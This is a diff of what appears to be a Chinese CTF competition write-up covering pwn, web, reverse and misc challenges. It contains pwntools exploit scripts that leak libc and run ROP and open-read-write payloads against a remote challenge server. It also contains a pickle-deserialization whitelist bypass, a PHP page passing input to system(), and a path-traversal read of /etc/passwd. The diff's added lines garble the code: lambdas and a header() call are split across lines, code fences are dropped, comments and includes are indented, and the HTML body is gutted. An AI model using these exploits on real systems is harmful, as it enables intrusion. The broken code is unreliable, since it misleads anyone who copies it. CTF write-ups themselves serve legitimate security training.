@@ -7,7 +7,7 @@
 
 admin@chamd5.org(带上简历和想加入的小组)
 
-Pwn 
+Pwn
 
 signin
 
@@ -33,13 +33,19 @@ sl  = lambda data   :p.sendline(data)
 sla = lambda text,data  :p.sendlineafter(text, data)
 r   = lambda num=4096   :p.recv(num)
 rl  = lambda text   :p.recvuntil(text)
-pr = lambda num=4096 :print(p.recv(num))
+pr = lambda num=4096 :
+print(p.recv(num))
 inter   = lambda        :p.interactive()
-l32 = lambda    :u32(p.recvuntil(b'xf7')[-4:].ljust(4,b'x00'))
-l64 = lambda    :u64(p.recvuntil(b'x7f')[-6:].ljust(8,b'x00'))
-uu32    = lambda    :u32(p.recv(4).ljust(4,b'x00'))
-uu64    = lambda    :u64(p.recv(6).ljust(8,b'x00'))
-int16   = lambda data   :int(data,16)
+l32 = lambda    :
+u32(p.recvuntil(b'xf7')[-4:].ljust(4,b'x00'))
+l64 = lambda    :
+u64(p.recvuntil(b'x7f')[-6:].ljust(8,b'x00'))
+uu32    = lambda    :
+u32(p.recv(4).ljust(4,b'x00'))
+uu64    = lambda    :
+u64(p.recv(6).ljust(8,b'x00'))
+int16   = lambda data   :
+int(data,16)
 lg= lambda s, num   :p.success('%s -> 0x%x' % (s, num))
 #-----------------------------------------------------------------------------------------
 
@@ -213,7 +219,7 @@ s(orw)
 
 inter()       
 
- Web 
+ Web
 
 ez_pickle
 
@@ -221,7 +227,8 @@ ez_pickle
 
 {"__init__":{"__globals__":{"secret_key":"111"}}}
 
-然后发现 pickle 反序列化存在 findclass 的 waf，通过污染白名单进行绕过
+然后发现 pickle 反序列化存在 find
+class 的 waf，通过污染白名单进行绕过
 
 {
     "__init__" : {
@@ -286,7 +293,8 @@ class CapooObj {
         system($this->action);
     }
 }
-header("Content-type:text/html;charset=utf-8");
+header("Content-type:
+text/html;charset=utf-8");
 if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['capoo'])) {
     $file = $_POST['capoo'];
     
@@ -312,10 +320,9 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['capoo'])) {
   <head>
     <title>Display Capoo</title>
   </head>
-  <body>
-    <img style='display:block; width:100px;height:100px;' id='base64image'
-       src='data:image/gif;base64, <?php echo $base64;?>' />
-  </body>
+  
+    ' />
+  
 </html>
 
 非预期：
@@ -324,11 +331,11 @@ capoo=capoo_img/../../../../../../etc/passwd 可读文件
 
 读start.sh可得flag文件名字，直接读flag
 
- Crypto 
+ Crypto
 
 XOR
 
- Reverse 
+ Reverse
 
 Serv1ce
 
@@ -425,7 +432,7 @@ for j in range(56):
     tmp[j] ^= x[j]
 print(bytes(tmp))
 
- Misc 
+ Misc
 
 Find way to read video
 
@@ -437,7 +444,9 @@ BV1wm2EY2Egx eyJ2IjozLCJuIjoiZjE0ZyIsInMiOiIiLCJoIjoiZjczZDEyZCIsIm0iOjkwLCJrIj
 
 第二个base解码
 
-{"v":3,"n":"f14g","s":"","h":"f73d12d","m":90,"k":81,"mg":200,"kg":130,"l":43,"sl":1,"fhl":["252f10c","acac86c","ca97811","cd0aa98","021fb59","2c62423","4e07408","4e07408","ca97811","2e7d2c0","6b86b27","3f79bb7","4e07408","3973e02","d4735e3","4b22777","7902699","e7f6c01","3973e02","4b22777","4b22777","6b86b27","2e7d2c0","3973e02","ca97811","3f79bb7","4e07408","d4735e3","3973e02","3f79bb7","3f79bb7","252f10c","3f79bb7","6b86b27","18ac3e7","5feceb6","4e07408","18ac3e7","18ac3e7","19581e2","3f79bb7","d10b36a","01ba471","6e340b9","6e340b9","6e340b9","6e340b9","6e340b9","6e340b9","6e340b9","6e340b9","6e340b9","6e340b9","6e340b9","6e340b9","6e340b9","6e340b9","6e340b9","6e340b9","6e340b9","6e340b9","6e340b9","6e340b9","6e340b9","6e340b9","6e340b9","6e340b9","6e340b9","6e340b9","6e340b9","6e340b9","6e340b9","6e340b9","6e340b9","6e340b9","6e340b9","6e340b9","6e340b9","6e340b9","6e340b9","6e340b9","77adfc9","de7d1b7","44bd7ae","bb7208b","83891d7","2a0ab73","fe1dcd3","559aead","f031efa"]}
+{"v":3,"n":"f14g","s":"","h":"f73d12d","m":90,"k":81,"mg":
+200,"kg":
+130,"l":43,"sl":1,"fhl":["252f10c","acac86c","ca97811","cd0aa98","021fb59","2c62423","4e07408","4e07408","ca97811","2e7d2c0","6b86b27","3f79bb7","4e07408","3973e02","d4735e3","4b22777","7902699","e7f6c01","3973e02","4b22777","4b22777","6b86b27","2e7d2c0","3973e02","ca97811","3f79bb7","4e07408","d4735e3","3973e02","3f79bb7","3f79bb7","252f10c","3f79bb7","6b86b27","18ac3e7","5feceb6","4e07408","18ac3e7","18ac3e7","19581e2","3f79bb7","d10b36a","01ba471","6e340b9","6e340b9","6e340b9","6e340b9","6e340b9","6e340b9","6e340b9","6e340b9","6e340b9","6e340b9","6e340b9","6e340b9","6e340b9","6e340b9","6e340b9","6e340b9","6e340b9","6e340b9","6e340b9","6e340b9","6e340b9","6e340b9","6e340b9","6e340b9","6e340b9","6e340b9","6e340b9","6e340b9","6e340b9","6e340b9","6e340b9","6e340b9","6e340b9","6e340b9","6e340b9","6e340b9","6e340b9","6e340b9","77adfc9","de7d1b7","44bd7ae","bb7208b","83891d7","2a0ab73","fe1dcd3","559aead","f031efa"]}
 
 ezflag
 
@@ -469,7 +478,10 @@ with open('md5_values.txt', 'w') as file:
 
 然后打开zip，补全二维码，扫码得到：
 
-D'`_q^K![YG{VDTveRc10qpnJ+*)G!~f1{d@-}v&lt;)9xqYonsrqj0hPlkdcb(`Hd]#a`_A@VzZY;Qu8NMqKPONGkK-,BGF?cCBA@"&gt;76Z:321U54-21*Non,+*#G'&amp;%$d"y?w_uzsr8vunVrk1ongOe+ihgfeG]#[ZY^WUZSwWVUNrRQ3IHGLEiCBAFE&gt;=aA:9&gt;765:981Uvu-2+O/.nm+$Hi'~}|B"!~}|u]s9qYonsrqj0hmlkjc)gIedcb[!YX]UZSwWVUN6LpP2HMFEDhHG@dDCBA:^!~&lt;;:921U/u3,+*Non&amp;%*)('&amp;}C{cy?}|{zs[q7unVl2ponmleMib(fHG]b[Z~k
+D'`_q^K![YG{VDTveRc10qpnJ+*)G!~f1{d@-}v&lt;)9xqYonsrqj0hPlkdcb(`Hd]#a`_A@VzZY;Qu8NMqKPONGkK-,BGF?cCBA@"&gt;76Z:
+321U54-21*Non,+*#G'&amp;%$d"y?w_uzsr8vunVrk1ongOe+ihgfeG]#[ZY^WUZSwWVUNrRQ3IHGLEiCBAFE&gt;=aA:9&gt;765:
+981Uvu-2+O/.nm+$Hi'~}|B"!~}|u]s9qYonsrqj0hmlkjc)gIedcb[!YX]UZSwWVUN6LpP2HMFEDhHG@dDCBA:^!~&lt;;:
+921U/u3,+*Non&amp;%*)('&amp;}C{cy?}|{zs[q7unVl2ponmleMib(fHG]b[Z~k
 
 然后搜索知道是malbolge编程语言，
 
@@ -493,7 +505,7 @@ from pwn import *
 from struct import pack
 from ctypes import *
 import base64
-#from LibcSearcher import *
+    #from LibcSearcher import *
 
 def debug(c = 0):
     if(c):
@@ -509,13 +521,19 @@ sl  = lambda data   :p.sendline(data)
 sla = lambda text,data  :p.sendlineafter(text, data)
 r   = lambda num=4096   :p.recv(num)
 rl  = lambda text   :p.recvuntil(text)
-pr = lambda num=4096 :print(p.recv(num))
+pr = lambda num=4096 :
+print(p.recv(num))
 inter   = lambda        :p.interactive()
-l32 = lambda    :u32(p.recvuntil(b'xf7')[-4:].ljust(4,b'x00'))
-l64 = lambda    :u64(p.recvuntil(b'x7f')[-6:].ljust(8,b'x00'))
-uu32    = lambda    :u32(p.recv(4).ljust(4,b'x00'))
-uu64    = lambda    :u64(p.recv(6).ljust(8,b'x00'))
-int16   = lambda data   :int(data,16)
+l32 = lambda    :
+u32(p.recvuntil(b'xf7')[-4:].ljust(4,b'x00'))
+l64 = lambda    :
+u64(p.recvuntil(b'x7f')[-6:].ljust(8,b'x00'))
+uu32    = lambda    :
+u32(p.recv(4).ljust(4,b'x00'))
+uu64    = lambda    :
+u64(p.recv(6).ljust(8,b'x00'))
+int16   = lambda data   :
+int(data,16)
 lg= lambda s, num   :p.success('%s -> 0x%x' % (s, num))
 #-----------------------------------------------------------------------------------------
 
@@ -524,7 +542,7 @@ p = process('./vuln')
 p=remote("pwn-0a25f7a133.challenge.xctf.org.cn", 9999, ssl=True)
 elf = ELF('./vuln')
 libc = ELF('libc.so.6')
-#gdb.attach(p,'b *0x4014b1')
+    #gdb.attach(p,'b *0x4014b1')
 s(b'a'*0x12)
 from ctypes import *
 cdll=CDLL('libc.so.6')
@@ -537,9 +555,9 @@ for i in range(100):
 pop_rdi = 0x0000000000401893
 ret = 0x000000000040101a
 
-#debug('b *0x4012a0')
-#p.interactive()
-#gdb.attach(p,'b *0x4013c0')
+    #debug('b *0x4012a0')
+    #p.interactive()
+    #gdb.attach(p,'b *0x4013c0')
 sa(b'>> n',p32(1))
 sa(b'Index: ',p32(1))
 sa(b'Note: ',b'a'*8)
@@ -591,17 +609,12 @@ pause()
 sleep(1)
 s(b'/flag')
 pause()
-#pause()
+    #pause()
 inter()
-```
-
-
-
-```
 from pwn import*
 from struct import pack
 import ctypes
-#from LibcSearcher import *
+    #from LibcSearcher import *
 from ae64 import AE64
 def bug():
         gdb.attach(p)
@@ -616,7 +629,7 @@ def sla(a,b):
         p.sendlineafter(a,b)
 def r(a):
         p.recv(a)
-#def pr(a):
+    #def pr(a):
         #print(p.recv(a))
 def rl(a):
         return p.recvuntil(a)
@@ -634,22 +647,22 @@ pr = lambda x : print('x1b[01;38;5;214m' + x + 'x1b[0m')
 ll = lambda x : print('x1b[01;38;5;1m' + x + 'x1b[0m')
 
     
-#context(os='linux',arch='i386',log_level='debug')   
+    #context(os='linux',arch='i386',log_level='debug')   
 context(os='linux',arch='amd64',log_level='debug')
 libc=ELF('./libc.so.6')   
-#libc=ELF('/root/glibc-all-in-one/libs/2.35-0ubuntu3.8_amd64/libc.so.6') 
-#libc=ELF('/lib/i386-linux-gnu/libc.so.6')
-#libc=ELF('libc-2.23.so') 
-#libc=ELF('/root/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc.so.6')    
-#libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")
+    #libc=ELF('/root/glibc-all-in-one/libs/2.35-0ubuntu3.8_amd64/libc.so.6') 
+    #libc=ELF('/lib/i386-linux-gnu/libc.so.6')
+    #libc=ELF('libc-2.23.so') 
+    #libc=ELF('/root/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc.so.6')    
+    #libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")
 elf=ELF('./pwn')
 p=remote()
-#p = process('./pwn')
+    #p = process('./pwn')
 
 rdi=0x0000000000401393
 rl("lets move and pwn!")
 payload=b'a'*(0x100+8)+p64(rdi)+p64(elf.got['puts'])+p64(elf.plt['puts'])+p64(0x4012F0)
-#bug()
+    #bug()
 s(payload)
 
 libc_base=get_addr64()-libc.sym['puts']
@@ -669,7 +682,7 @@ mprotect=libc_base + libc.sym['mprotect']
 bss=0x404060+0x500
 rl("lets move and pwn!")
 payload=b'a'*(0x100)+p64(bss)+p64(rsi)+p64(bss)+p64(read)+p64(0x4012EE)
-#bug()
+    #bug()
 s(payload)
 pause()
 orw  = b'/flagx00x00x00'
@@ -690,17 +703,7 @@ pr(hex(len(orw)))
 s(orw)
 
 inter()
-```
-
-
-
-```
 {"__init__":{"__globals__":{"secret_key":"111"}}}
-```
-
-
-
-```
 {
     "__init__" : {
         "__globals__" : {
@@ -716,11 +719,6 @@ inter()
         }
     }
 }
-```
-
-
-
-```
 # 给定的字节数据
 a='''cbuiltins
 getattr
@@ -746,11 +744,6 @@ with open(filename, 'wb') as f:
     f.write(a)
 
 print(f"字节数据已成功写入到文件: {filename}")
-```
-
-
-
-```
 ##showpic.php源码
 <?php
 class CapooObj {
@@ -766,7 +759,8 @@ class CapooObj {
         system($this->action);
     }
 }
-header("Content-type:text/html;charset=utf-8");
+header("Content-type:
+text/html;charset=utf-8");
 if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['capoo'])) {
     $file = $_POST['capoo'];
     
@@ -792,16 +786,10 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['capoo'])) {
   <head>
     <title>Display Capoo</title>
   </head>
-  <body>
-    <img style='display:block; width:100px;height:100px;' id='base64image'
-       src='data:image/gif;base64, <?php echo $base64;?>' />
-  </body>
+  
+    ' />
+  
 </html>
-```
-
-
-
-```
 enc = [0xB9, 0x32, 0xC2, 0xD4, 0x69, 0xD5, 0xCA, 0xFB, 0xF8, 0xFB, 0x80, 0x7C, 0xD4, 0xE5, 0x93, 0xD5, 0x1C, 0x8B, 0xF8, 0xDF, 0xDA, 0xA1, 0x11, 0xF8, 0xA1, 0x93, 0x93, 0xC2, 0x7C, 0x8B, 0x1C, 0x66, 0x01, 0x3D, 0xA3, 0x67]
 
 key = b"1liIl11lIllIIl11llII"
@@ -817,13 +805,8 @@ for i in range(36):
         tmp &= 0xff
         if tmp == enc[i]:
             print(chr(j), end = '')
-```
-
-
-
-```
-#include <stdio.h>  
-#include <stdint.h>  
+    #include <stdio.h>  
+    #include <stdint.h>  
   
 void encipher(unsigned int num_rounds, uint32_t v[2], uint32_t const key[4]) {  
     unsigned int i;  
@@ -867,11 +850,6 @@ int main()  
         putchar(10);
     return 0;  
 }
-```
-
-
-
-```
 enc = [0xd9, 0xd3, 0xde, 0xd8, 0xc4, 0xca, 0xe0, 0xde, 0xcd, 0xc, 0xe0, 0xcd, 0xda, 0xff, 0xe, 0xe, 0xc6, 0xe0, 0xd8, 0xf, 0xf, 0xdb, 0xe0, 0xff, 0xcb, 0xe0, 0xf, 0xe, 0xe, 0xc9, 0xd2, 0xe0, 0xdb, 0xda, 0xf, 0xdd, 0xd9, 0xe0, 0xde, 0xd1, 0xdb, 0xe0, 0xde, 0xd1, 0xcb, 0xd6, 0xe0, 0xdb, 0xda, 0xdd, 0xca, 0xd8, 0xd8, 0xda, 0xcd, 0xc2]
 x = [191]*56
 x = [191, 191, 191, 191, 191, 191, 191, 191, 191, 63, 191, 191, 191, 191, 63, 63, 191, 191, 191, 63, 63, 191, 191, 191, 191, 191, 63, 63, 63, 191, 191, 191, 191, 191, 63, 191, 191, 191, 191, 191, 191, 191, 191, 191, 191, 191, 191, 191, 191, 191, 191, 191, 191, 191, 191, 191]
@@ -879,23 +857,10 @@ tmp = enc[:]
 for j in range(56):
     tmp[j] ^= x[j]
 print(bytes(tmp))
-```
-
-
-
-```
 BV1wm2EY2Egx eyJ2IjozLCJuIjoiZjE0ZyIsInMiOiIiLCJoIjoiZjczZDEyZCIsIm0iOjkwLCJrIjo4MSwibWciOjIwMCwia2ciOjEzMCwibCI6NDMsInNsIjoxLCJmaGwiOlsiMjUyZjEwYyIsImFjYWM4NmMiLCJjYTk3ODExIiwiY2QwYWE5OCIsIjAyMWZiNTkiLCIyYzYyNDIzIiwiNGUwNzQwOCIsIjRlMDc0MDgiLCJjYTk3ODExIiwiMmU3ZDJjMCIsIjZiODZiMjciLCIzZjc5YmI3IiwiNGUwNzQwOCIsIjM5NzNlMDIiLCJkNDczNWUzIiwiNGIyMjc3NyIsIjc5MDI2OTkiLCJlN2Y2YzAxIiwiMzk3M2UwMiIsIjRiMjI3NzciLCI0YjIyNzc3IiwiNmI4NmIyNyIsIjJlN2QyYzAiLCIzOTczZTAyIiwiY2E5NzgxMSIsIjNmNzliYjciLCI0ZTA3NDA4IiwiZDQ3MzVlMyIsIjM5NzNlMDIiLCIzZjc5YmI3IiwiM2Y3OWJiNyIsIjI1MmYxMGMiLCIzZjc5YmI3IiwiNmI4NmIyNyIsIjE4YWMzZTciLCI1ZmVjZWI2IiwiNGUwNzQwOCIsIjE4YWMzZTciLCIxOGFjM2U3IiwiMTk1ODFlMiIsIjNmNzliYjciLCJkMTBiMzZhIiwiMDFiYTQ3MSIsIjZlMzQwYjkiLCI2ZTM0MGI5IiwiNmUzNDBiOSIsIjZlMzQwYjkiLCI2ZTM0MGI5IiwiNmUzNDBiOSIsIjZlMzQwYjkiLCI2ZTM0MGI5IiwiNmUzNDBiOSIsIjZlMzQwYjkiLCI2ZTM0MGI5IiwiNmUzNDBiOSIsIjZlMzQwYjkiLCI2ZTM0MGI5IiwiNmUzNDBiOSIsIjZlMzQwYjkiLCI2ZTM0MGI5IiwiNmUzNDBiOSIsIjZlMzQwYjkiLCI2ZTM0MGI5IiwiNmUzNDBiOSIsIjZlMzQwYjkiLCI2ZTM0MGI5IiwiNmUzNDBiOSIsIjZlMzQwYjkiLCI2ZTM0MGI5IiwiNmUzNDBiOSIsIjZlMzQwYjkiLCI2ZTM0MGI5IiwiNmUzNDBiOSIsIjZlMzQwYjkiLCI2ZTM0MGI5IiwiNmUzNDBiOSIsIjZlMzQwYjkiLCI2ZTM0MGI5IiwiNmUzNDBiOSIsIjZlMzQwYjkiLCI2ZTM0MGI5IiwiNzdhZGZjOSIsImRlN2QxYjciLCI0NGJkN2FlIiwiYmI3MjA4YiIsIjgzODkxZDciLCIyYTBhYjczIiwiZmUxZGNkMyIsIjU1OWFlYWQiLCJmMDMxZWZhIl19
-```
-
-
-
-```
-{"v":3,"n":"f14g","s":"","h":"f73d12d","m":90,"k":81,"mg":200,"kg":130,"l":43,"sl":1,"fhl":["252f10c","acac86c","ca97811","cd0aa98","021fb59","2c62423","4e07408","4e07408","ca97811","2e7d2c0","6b86b27","3f79bb7","4e07408","3973e02","d4735e3","4b22777","7902699","e7f6c01","3973e02","4b22777","4b22777","6b86b27","2e7d2c0","3973e02","ca97811","3f79bb7","4e07408","d4735e3","3973e02","3f79bb7","3f79bb7","252f10c","3f79bb7","6b86b27","18ac3e7","5feceb6","4e07408","18ac3e7","18ac3e7","19581e2","3f79bb7","d10b36a","01ba471","6e340b9","6e340b9","6e340b9","6e340b9","6e340b9","6e340b9","6e340b9","6e340b9","6e340b9","6e340b9","6e340b9","6e340b9","6e340b9","6e340b9","6e340b9","6e340b9","6e340b9","6e340b9","6e340b9","6e340b9","6e340b9","6e340b9","6e340b9","6e340b9","6e340b9","6e340b9","6e340b9","6e340b9","6e340b9","6e340b9","6e340b9","6e340b9","6e340b9","6e340b9","6e340b9","6e340b9","6e340b9","6e340b9","77adfc9","de7d1b7","44bd7ae","bb7208b","83891d7","2a0ab73","fe1dcd3","559aead","f031efa"]}
-```
-
-
-
-```
+{"v":3,"n":"f14g","s":"","h":"f73d12d","m":90,"k":81,"mg":
+200,"kg":
+130,"l":43,"sl":1,"fhl":["252f10c","acac86c","ca97811","cd0aa98","021fb59","2c62423","4e07408","4e07408","ca97811","2e7d2c0","6b86b27","3f79bb7","4e07408","3973e02","d4735e3","4b22777","7902699","e7f6c01","3973e02","4b22777","4b22777","6b86b27","2e7d2c0","3973e02","ca97811","3f79bb7","4e07408","d4735e3","3973e02","3f79bb7","3f79bb7","252f10c","3f79bb7","6b86b27","18ac3e7","5feceb6","4e07408","18ac3e7","18ac3e7","19581e2","3f79bb7","d10b36a","01ba471","6e340b9","6e340b9","6e340b9","6e340b9","6e340b9","6e340b9","6e340b9","6e340b9","6e340b9","6e340b9","6e340b9","6e340b9","6e340b9","6e340b9","6e340b9","6e340b9","6e340b9","6e340b9","6e340b9","6e340b9","6e340b9","6e340b9","6e340b9","6e340b9","6e340b9","6e340b9","6e340b9","6e340b9","6e340b9","6e340b9","6e340b9","6e340b9","6e340b9","6e340b9","6e340b9","6e340b9","6e340b9","6e340b9","77adfc9","de7d1b7","44bd7ae","bb7208b","83891d7","2a0ab73","fe1dcd3","559aead","f031efa"]}
 import hashlib
 
 def calculate_md5(number):
@@ -915,12 +880,10 @@ with open('md5_values.txt', 'w') as file:
     for i in range(1001):
         md5_value = calculate_md5(i)
         file.write(f"{md5_value}n")
-```
-
-
-
-```
-D'`_q^K![YG{VDTveRc10qpnJ+*)G!~f1{d@-}v&lt;)9xqYonsrqj0hPlkdcb(`Hd]#a`_A@VzZY;Qu8NMqKPONGkK-,BGF?cCBA@"&gt;76Z:321U54-21*Non,+*#G'&amp;%$d"y?w_uzsr8vunVrk1ongOe+ihgfeG]#[ZY^WUZSwWVUNrRQ3IHGLEiCBAFE&gt;=aA:9&gt;765:981Uvu-2+O/.nm+$Hi'~}|B"!~}|u]s9qYonsrqj0hmlkjc)gIedcb[!YX]UZSwWVUN6LpP2HMFEDhHG@dDCBA:^!~&lt;;:921U/u3,+*Non&amp;%*)('&amp;}C{cy?}|{zs[q7unVl2ponmleMib(fHG]b[Z~k
+D'`_q^K![YG{VDTveRc10qpnJ+*)G!~f1{d@-}v&lt;)9xqYonsrqj0hPlkdcb(`Hd]#a`_A@VzZY;Qu8NMqKPONGkK-,BGF?cCBA@"&gt;76Z:
+321U54-21*Non,+*#G'&amp;%$d"y?w_uzsr8vunVrk1ongOe+ihgfeG]#[ZY^WUZSwWVUNrRQ3IHGLEiCBAFE&gt;=aA:9&gt;765:
+981Uvu-2+O/.nm+$Hi'~}|B"!~}|u]s9qYonsrqj0hmlkjc)gIedcb[!YX]UZSwWVUN6LpP2HMFEDhHG@dDCBA:^!~&lt;;:
+921U/u3,+*Non&amp;%*)('&amp;}C{cy?}|{zs[q7unVl2ponmleMib(fHG]b[Z~k
 ```
 
 
